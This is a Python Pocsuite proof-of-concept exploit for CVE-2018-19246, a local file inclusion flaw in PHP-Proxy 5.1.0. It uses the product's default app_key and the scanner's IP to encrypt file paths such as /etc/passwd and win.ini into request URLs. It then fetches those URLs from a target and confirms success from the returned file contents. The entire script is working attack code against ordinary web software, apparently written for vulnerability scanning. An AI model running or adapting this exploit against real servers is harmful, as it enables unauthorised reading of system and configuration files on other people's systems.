#!/usr/bin/env python2
# -*- coding: utf-8 -*-

from pocsuite.api.request import req
from pocsuite.api.poc import register, Output, POCBase
from pocsuite.thirdparty.guanxing import parse_ip_port, http_packet, make_verify_url
from hashlib import md5
from base64 import b64encode
from string import maketrans
import socket

class TestPOC(POCBase):
  vulID = ''''''
  cveID = '''CVE-2018-19246'''
  cnvdID = ''''''
  cnnvdID = ''''''
  version = '''5.1.0'''
  author = ''''''
  vulDate = '''2018-11-13'''
  createDate = ''''''
  updateDate = ''''''
  name = '''PHP-Proxy 5.1.0 - Local File Inclusion'''
  desc = '''Downloadable pre-installed version of PHP-Proxy 5.1.0 make use of a default app_key wherein can be used for local file inclusion attacks. This can be used to generate encrypted string which can gain access to arbitrary local files in the server. http://php-proxy-site/index.php?q=[encrypted_string_value]'''
  solution = '''Use the setup.txt script included on the downloadable pre-installed version of PHP-Proxy to generate and overwrite the default app_key'''
  severity = '''7.5 HIGH'''
  vulType = ''''''
  taskType = ''''''
  references = ['''''']
  appName = ''''''
  appVersion = ''''''
  appPowerLink = ''''''
  samples = ['']
  install_requires = ['''''']

  def str_rot_pass(self, content, cipher, decrypt=False):
    cipher_len = len(cipher)
    str_len = len(content)
    result = ''
    for i in range(str_len):
      asc = ord(content[i]) - ord(cipher[i % cipher_len]) if decrypt else ord(content[i]) + ord(cipher[i % cipher_len])
      result += chr(asc)
    return result
  
  def base64_url_encode(self, content):
    table = maketrans('+/', '-_')
    return b64encode(content).translate(table).rstrip('=')

  def _verify(self):
    self.url, ip, port = parse_ip_port(self.target, 80)
    result = {}
    headers = {
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
    }
    files = ['file:///etc/passwd', 'file:///C:/Windows/win.ini']
    checkings = ['root:', '[fonts]']

    # 生成一个 UDP 包以获取用来访问网站的 ip
    u_ip = '127.0.0.1'
    try:
      so = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      so.connect((ip, 80))
      u_ip = so.getsockname()[0]
    finally:
      so.close()

    app_key = 'aeb067ca0aa9a3193dce3a7264c90187'
    key = md5(app_key + u_ip).hexdigest()
    paths = ['?q=' + self.base64_url_encode(self.str_rot_pass(file, key)) for file in files]  # 漏洞的路径
    for i in range(len(paths)):
      path = paths[i]
      vul_url = make_verify_url(self.url, path, mod=0)  # 生成完整路径
      data = ''  # 漏洞的data数据
      resp = req.get(vul_url,
                    headers=headers,
                    data=data,
                    verify=False,
                    allow_redirects=False,
                    timeout=10)
      if resp.status_code == 200 and checkings[i] in resp.content:  # 判断条件
        result['VerifyInfo'] = http_packet(resp)
        result['VerifyInfo']['URL'] = vul_url
        result['VerifyInfo']['port'] = port
        break
    return self.parse_output(result)

  def _attack(self):
    return self._verify()

  def parse_output(self, result):
    output = Output(self)
    if result:
      output.success(result)
    else:
      output.fail('Failed')
    return output


register(TestPOC)
